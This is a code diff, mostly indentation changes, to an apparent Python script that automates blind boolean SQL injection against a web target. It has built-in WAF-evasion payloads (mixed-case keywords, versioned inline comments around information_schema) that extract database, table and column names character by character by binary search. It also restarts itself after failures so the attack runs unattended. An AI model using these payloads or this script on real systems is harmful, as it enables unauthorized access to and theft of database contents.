@@ -109,33 +109,33 @@ try:
 			# ------------------------------------------------------------------------------------------------------------
 			
 			##Decisions: The set of conditions below determines how the code will know that the value guessed is correct/incorrect based on the response of the web server
-            ##This depends on the target website
-
-            #Examples:
+			##This depends on the target website
+	
+			#Examples:
 			# if status 200 => correct guess => break and guess next char #ATTENTION: Not always true
 
-            #In this script, we consider the following case
-            #The website returns: 
-                #200 status code <=> legitimate request <=> WAF bypassed successfully 
-                    #If the guess is Correct: "Example" text is displayed
-                    #If the guess is Incorrect: "Example" text is missing from the response
-                #406 status code <=> WAF detects the SQL Injection attack
-                    #"Not Acceptable" text is displayed
-        
+		    	#In this script, we consider the following case
+		    	#The website returns: 
+				#200 status code <=> legitimate request <=> WAF bypassed successfully 
+				    #If the guess is Correct: "Example" text is displayed
+				    #If the guess is Incorrect: "Example" text is missing from the response
+				#406 status code <=> WAF detects the SQL Injection attack
+				    #"Not Acceptable" text is displayed
+		
 			##GUESSING ALGORITHM
 			print(f"Testing: {''.join(new_query)+charac}") #For Visualization and Debugging
             
-            #Case 1: WAF Triggered, in which case we stop the code
+            		#Case 1: WAF Triggered, in which case we stop the code
 			if "Not Acceptable" in str(resp.content) : #Status code is 406: Not Acceptable
 				print("WAF in the house") #WAF Detected, a bypass must be figured out
 				exit() #Stop running the code because WAF will block all requests if it's not bypassed
             
-            #Case 2: WAF Bypassed and the guess is Incorrect, in which case we start running the bruteforce algorithm
+            		#Case 2: WAF Bypassed and the guess is Incorrect, in which case we start running the bruteforce algorithm
 			elif resp.status_code==200 and "Example" not in str(resp.content):
 				
-                ##ONLY ONE LINE OF THE LINES BELOW IS TO BE UNCOMMENTED
+				##ONLY ONE LINE OF THE LINES BELOW IS TO BE UNCOMMENTED
 				
-                #Use the line below this one to extract all databases 
+                		#Use the line below this one to extract all databases 
 				# resp = requests.get(f"{url}?id=1+and+substring((select%20group_concat(distinct table_schema)%20rate%20FrOm/*!information_schema*/.tables),{position},1)>'{charac}'", headers=Headers)
 
 				#Use the line below this one to extract all columns of a given table
@@ -147,7 +147,7 @@ try:
 				#Use the line below to extract all columns of all tables of a given db
 				#resp = requests.get(f"{url}?id=1+and+substring((SeLeCt%20GrOuP_CoNcAt(DiStIncT column_name)%20hiya%20FrOm/*!information_schema*/.columns),{position},1)>'{charac}'", headers=Headers)
                 
-                ##END ONLY ONE LINE OF THE LINES BELOW IS TO BE UNCOMMENTED
+                		##END ONLY ONE LINE OF THE LINES BELOW IS TO BE UNCOMMENTED
 
 				if "Example" not in str(resp.content):
 					search_range = search_range[:len(search_range)//2]
@@ -158,24 +158,23 @@ try:
 				# print(f"keep the part on the right, new search_range is: {search_range}") #For debugging purposes 
 				continue
 
-            #Case 2: WAF Bypassed and the guess is Correct, in which case we note the character revealed
+			#Case 2: WAF Bypassed and the guess is Correct, in which case we note the character revealed
 			elif resp.status_code==200 and "Example" in str(resp.content):
 				# print("found") #For debugging purposes
 				new_query.append(charac) #Append the character guessed to the list of data collected
 				break #Start guessing the next character
 
-            #Case 3: Unknown response (We never know what might happen XD)
+            		#Case 3: Unknown response (We never know what might happen XD)
 			else:
 				print("Unexpected Error Occurred!")
 				print(resp.url) #For debugging purposes
 				print(str(resp.content)) #For debugging purposes
 
 			##END GUESSING ALGORITHM
+
 #In case of a failure or the code stops running, write the progress to the file and restart the program. This is to automate the attack, to avoid manual restarting
 except:
 	with open(file_name, 'w') as file:
 		new_query = ''.join(new_query)
 		file.write(new_query)
 	os.system("python script.py")
-
-# resp = requests.get(f"{url}?id=1 and select+substring(group_concat(id),110,1)+rate+from+rate=1", headers=Headers)
